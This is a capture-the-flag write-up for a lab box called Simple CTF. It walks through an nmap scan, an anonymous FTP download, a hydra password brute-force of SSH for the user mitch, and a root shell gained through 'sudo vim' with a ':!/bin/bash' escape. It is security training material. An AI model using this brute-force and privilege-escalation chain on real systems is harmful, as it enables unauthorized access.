# SIMPLE CTF
## User Flag:
Firstly check the services open on the device with `nmap 10.64.161.235`
```
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1

I saw these services were open, so I ran this to get more info on the ftp service
nmap -p21 -sC -sV 10.64.161.235

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.216.167
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
Service Info: OS: Unix
```
As we can see, **anonymous FTP login is allowed**, so I used lftp to get the public file off the server:

`lftp anonymous@10.64.161.235`

Once you're inside, follow the steps below to transfer the files from the /pub folder:

```
Password: 
lftp anonymous@10.64.161.235:~> set ftp:passive-mode false
lftp anonymous@10.64.161.235:~> set ftp:prefer-epsv false
lftp anonymous@10.64.161.235:~> ls
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
lftp anonymous@10.64.161.235:/> cd pub
lftp anonymous@10.64.161.235:/pub> ls
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
lftp anonymous@10.64.161.235:/pub> mirror
New: 1 file, 0 symlinks                                          
166 bytes transferred
lftp anonymous@10.64.161.235:/pub> 
```

We can read the file named ForMitch which comes from that folder: 
*Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!*

We can assume that the user may be Mitch and if the password is easy to crack, lets run hydra on that other ssh service:

`hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.64.161.235:2222`

And we'll crack it:

`[2222][ssh] host: 10.64.161.235   login: mitch   password: secret`

## Root Flag:

if we run `sudo -l` we can see that **mitch can run vim as root**, and **vim can run commands** so we just do:

`sudo vim -c ':!/bin/bash'`

and we get root access to read the root flag
